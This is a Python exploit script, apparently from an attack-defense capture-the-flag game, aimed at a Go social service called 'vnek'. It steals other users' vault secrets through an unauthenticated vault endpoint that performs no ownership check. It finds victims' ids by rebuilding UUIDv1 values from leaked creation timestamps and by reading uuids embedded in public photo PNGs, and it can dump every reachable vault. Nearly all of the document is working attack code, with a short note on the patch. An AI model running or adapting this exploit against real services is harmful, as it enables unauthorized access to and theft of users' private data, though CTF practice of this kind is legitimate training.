"""Exploit for the vnek service (Go "ВнеКонтакта", :28080) — steals a victim's
vault secret (= the flag) from another team's box.

vnek keeps the flag in a user's vault `secret`. Reading someone else's vault is
the whole game, and the service hands us the pieces two different ways. This
exploit tries every working angle, in cheap-to-expensive order, and is gated on
a one-shot BOLA probe so it never grinds on a box that already patched.

BUG 1 — unauthenticated vault read (BOLA). The shipped `GET /api/vault?uuid=<id>`
returns ANY user's secret with no ownership check (confirmed live:
`u,_ := Vault(ctx, query("uuid")); respond(200, {"uuid":u.ID,"secret":u.Secret})`).

Getting the victim's id, two ways:
  (a) UUIDv1 reconstruction — ids are UUIDv1 whose node+clock_seq come from a
      per-box DB seed (fixed box-wide; learned from OUR OWN registered uuid),
      and /api/users + /api/profile leak each user's `created` = the victim's
      own v1 timestamp at 100ns. victim_uuid = assemble(created, node, clock_seq).
      Exact, no brute force. (Defeated only if the box moved to UUIDv4.)
  (b) BUG 2 — photo-worker stamps the uploader's uuid into every output PNG as a
      tEXt "UUU" chunk, and post photos are public at /uploads/. So the public
      feed (/api/posts) leaks author->uuid directly. This yields REAL uuids even
      on boxes that switched to UUIDv4 to dodge (a) — it reads the id off the
      picture instead of deriving it.

Then GET /api/vault?uuid=<victim_uuid> -> {"secret": "<FLAG>"}.

flag_id may be JSON {"username": "..."} (live format), a bare username, a bare
uuid, or None (dump everything we can reach).

Patch (defense, see defense/vnek_vault_bola.md): vault must require auth and
return only the caller's own secret (our box does). Also stop the photo-worker
stamping the uuid into public images, and prefer random (v4) ids.

Interface: exploit(host, port, flag_id) -> list[str]
Deps: requests (stdlib base64/re/uuid otherwise).
"""
import calendar
import json
import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
_UUU_RE = re.compile(rb"UUU\x00([0-9a-fA-F-]{36})")   # photo-worker's embedded-uuid chunk
TIMEOUT = 6
MAX_ENUM = 60                 # cap users/photos processed per call
G1582 = 122192928000000000    # 100 ns ticks between the Gregorian (1582) and Unix epochs

# Per-box cache: session (cookie), this box's node/clock_seq, and the BOLA verdict.
# A box restart rotates neither seed nor verdict, but kills the session; we detect
# that via /api/me and re-register.
_SESS = {}

_UUID_RE = re.compile(r"\A[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
                      r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\Z")
_TS_RE = re.compile(r"(\d{4})-(\d{2})-(\d{2})[Tt](\d{2}):(\d{2}):(\d{2})"
                    r"(?:\.(\d+))?([Zz]|[+-]\d{2}:?\d{2})?\Z")


def _rand(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _scan(*values):
    out = []
    for v in values:
        if v:
            out.extend(FLAG_RE.findall(str(v)))
    return out


# ---- UUIDv1 reconstruction -------------------------------------------------

def _parse_rfc3339_ns(s):
    if not isinstance(s, str):
        return None
    m = _TS_RE.match(s.strip())
    if not m:
        return None
    y, mo, d, h, mi, se = (int(m.group(i)) for i in range(1, 7))
    frac = (m.group(7) or "")[:9].ljust(9, "0")
    nsec = int(frac)
    tz = m.group(8)
    off = 0
    if tz and tz not in ("Z", "z"):
        sign = 1 if tz[0] == "+" else -1
        z = tz[1:].replace(":", "")
        off = sign * (int(z[:2]) * 3600 + int(z[2:4]) * 60)
    try:
        epoch = calendar.timegm((y, mo, d, h, mi, se, 0, 0, 0)) - off
    except (ValueError, OverflowError):
        return None
    return epoch * 1_000_000_000 + nsec


def _assemble_uuid(created, node6, cs2):
    unix_ns = _parse_rfc3339_ns(created)
    if unix_ns is None or node6 is None or cs2 is None:
        return None
    tick = unix_ns // 100 + G1582
    b = bytearray(16)
    b[0:4] = (tick & 0xFFFFFFFF).to_bytes(4, "big")
    b[4:6] = ((tick >> 32) & 0xFFFF).to_bytes(2, "big")
    b[6:8] = (((tick >> 48) & 0x0FFF) | 0x1000).to_bytes(2, "big")   # version 1
    b[8:10] = cs2
    b[10:16] = node6
    h = b.hex()
    return "%s-%s-%s-%s-%s" % (h[0:8], h[8:12], h[12:16], h[16:20], h[20:32])


def _cs_candidates(cs2, span):
    """clock_seq is ~constant per box but can increment on 100ns collisions;
    victims registered earlier have an equal-or-smaller value, so try exact then
    a decreasing window."""
    if not cs2:
        return []
    base = ((cs2[0] & 0x3F) << 8) | cs2[1]
    seen, out = set(), []
    for dec in range(max(1, span)):
        v = (base - dec) & 0x3FFF
        c = bytes([0x80 | ((v >> 8) & 0x3F), v & 0xFF])
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out


def _uuid_bytes(u):
    try:
        return bytes.fromhex(str(u).replace("-", ""))
    except ValueError:
        return None


# ---- flag_id ---------------------------------------------------------------

def _flag_id_target(fid):
    """('uuid', v) | ('username', v) | (None, None) from a flag_id that may be a
    bare uuid, a bare username, or JSON like {"username": ...} / {"uuid": ...}."""
    if not fid:
        return None, None
    s = fid.strip()
    if s[:1] in "{[":
        try:
            j = json.loads(s)
        except ValueError:
            j = None
        if isinstance(j, dict):
            for k in ("uuid", "id", "user_id", "userId"):
                val = j.get(k)
                if isinstance(val, str) and _UUID_RE.match(val):
                    return "uuid", val
            for k in ("username", "user", "name", "login"):
                val = j.get(k)
                if isinstance(val, str) and val:
                    return "username", val
    if _UUID_RE.match(s):
        return "uuid", s
    return "username", s


# ---- session / box fingerprint ---------------------------------------------

def _register(base):
    s = requests.Session()
    for _ in range(2):
        try:
            r = s.post(base + "/api/register",
                       data={"username": "lab" + _rand(10), "password": _rand(16)},
                       timeout=TIMEOUT)
        except requests.RequestException:
            return None, None, None
        if r.status_code == 200:
            my_uuid = None
            try:
                my_uuid = r.json().get("uuid")
            except ValueError:
                my_uuid = None
            if not my_uuid:
                try:
                    my_uuid = s.get(base + "/api/me", timeout=TIMEOUT).json().get("id")
                except (ValueError, requests.RequestException):
                    my_uuid = None
            if my_uuid and _UUID_RE.match(my_uuid) and my_uuid[14] == "1":  # need v1 for recon
                raw = _uuid_bytes(my_uuid)
                if raw:
                    return s, raw[10:16], raw[8:10]
            return s, None, None          # session ok; node/cs unknown (box on UUIDv4)
    return None, None, None


def _session(base, force=False):
    if not force:
        c = _SESS.get(base)
        if c:
            try:
                if c["s"].get(base + "/api/me", timeout=TIMEOUT).status_code == 200:
                    return c["s"], c["node"], c["cs"]
            except requests.RequestException:
                pass
    s, node, cs = _register(base)
    if s is not None:
        prev = _SESS.get(base, {})
        _SESS[base] = {"s": s, "node": node, "cs": cs, "bola": prev.get("bola")}
    else:
        _SESS.pop(base, None)
    return s, node, cs


def _bola_open(s, base):
    """Cache whether /api/vault leaks a *different* user's secret. Register a
    throwaway B in its own session, have B stash a unique marker, then read B's
    vault from our main session A. Marker back == BOLA open."""
    c = _SESS.get(base, {})
    if c.get("bola") is not None:
        return c["bola"]
    verdict = False
    try:
        sb = requests.Session()
        rb = sb.post(base + "/api/register",
                     data={"username": "pb" + _rand(10), "password": _rand(16)}, timeout=TIMEOUT)
        bid = rb.json().get("uuid") if rb.status_code == 200 else None
        if bid:
            mark = "ZBOLA" + _rand(22)
            sb.post(base + "/api/vault/set", data={"secret": mark}, timeout=TIMEOUT)
            rr = s.get(base + "/api/vault", params={"uuid": bid}, timeout=TIMEOUT)
            verdict = rr.status_code == 200 and mark in rr.text
    except (ValueError, requests.RequestException):
        verdict = False
    if base in _SESS:
        _SESS[base]["bola"] = verdict
    return verdict


# ---- primitives ------------------------------------------------------------

def _read_vault(s, base, victim_uuid):
    out = []
    for param in ("uuid", "id"):
        try:
            r = s.get(base + "/api/vault", params={param: victim_uuid}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code == 200:
            try:
                j = r.json()
                out.extend(_scan(j.get("secret"), j.get("vault")))
            except ValueError:
                pass
            out.extend(_scan(r.text))
            if out:
                break
    return out


def _created_for_username(s, base, username):
    try:
        r = s.get(base + "/api/profile", params={"username": username}, timeout=TIMEOUT)
        if r.status_code == 200:
            return r.json().get("created")
    except (ValueError, requests.RequestException):
        pass
    return None


def _all_users_created(s, base):
    try:
        data = s.get(base + "/api/users", timeout=TIMEOUT).json()
    except (ValueError, requests.RequestException):
        return []
    out = []
    if isinstance(data, list):
        for u in data:
            if isinstance(u, dict):
                c = u.get("Created") or u.get("created")
                if c:
                    out.append(c)
            elif isinstance(u, (list, tuple)) and len(u) >= 3:
                out.append(u[2])
    return out


def _photo_uuids(s, base, cap=MAX_ENUM):
    """author -> uuid, read from the tEXt 'UUU' chunk of each public post photo.
    Only the PNG head is fetched (Range), so this stays cheap."""
    out = {}
    try:
        posts = s.get(base + "/api/posts", timeout=TIMEOUT).json()
    except (ValueError, requests.RequestException):
        return out
    if not isinstance(posts, list):
        return out
    for p in posts[:cap]:
        if not isinstance(p, dict):
            continue
        photo = p.get("Photo") or p.get("photo")
        author = p.get("Author") or p.get("author") or ""
        if not photo or not isinstance(photo, str):
            continue
        url = base + (photo if photo.startswith("/") else "/" + photo)
        try:
            r = s.get(url, headers={"Range": "bytes=0-8191"}, timeout=TIMEOUT)
            head = r.content[:16384]
        except requests.RequestException:
            continue
        m = _UUU_RE.search(head)
        if m:
            out[author] = m.group(1).decode()
    return out


def _target_vault(s, base, node, cs, created, span):
    for c in _cs_candidates(cs, span):
        u = _assemble_uuid(created, node, c)
        if not u:
            continue
        got = _read_vault(s, base, u)
        if got:
            return got
    return []


# ---- orchestration ---------------------------------------------------------

def exploit(host, port, flag_id):
    flags, seen = [], set()

    def take(found):
        for f in found:
            if f not in seen:
                seen.add(f)
                flags.append(f)

    try:
        base = "http://%s:%s" % (host, port)       # %s: a bad port returns [] instead of raising
        kind, val = _flag_id_target(None if flag_id is None else str(flag_id))

        s, node, cs = _session(base)
        if s is None:
            # Unauth vuln build needs no session; still try a direct uuid read.
            if kind == "uuid":
                take(_read_vault(requests.Session(), base, val))
            return flags

        # Direct uuid: one read (BOLA build returns the secret; patched returns ours).
        if kind == "uuid":
            take(_read_vault(s, base, val))
            return flags

        if not _bola_open(s, base):
            return flags                           # vault locked here — nothing to reach

        # --- targeted username first (cheap, precise) ---
        if kind == "username":
            created = _created_for_username(s, base, val)
            if created and node is not None and cs is not None:
                take(_target_vault(s, base, node, cs, created, span=16))   # UUIDv1 box
            if not flags:
                u = _photo_uuids(s, base).get(val)                         # UUIDv4 box
                if u:
                    take(_read_vault(s, base, u))
            if flags:
                return flags
            # fall through to dump-all

        # --- dump-all: grab every reachable vault ---
        # 1) photo-leaked uuids (works on UUIDv4 boxes)
        for author, u in _photo_uuids(s, base).items():
            take(_read_vault(s, base, u))
        # 2) reconstruct every user from /api/users (UUIDv1 boxes)
        if node is not None and cs is not None:
            for created in _all_users_created(s, base)[:MAX_ENUM]:
                take(_target_vault(s, base, node, cs, created, span=12))
    except Exception:
        return flags
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 28080
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for fl in exploit(h, p, fid):
        print(fl)
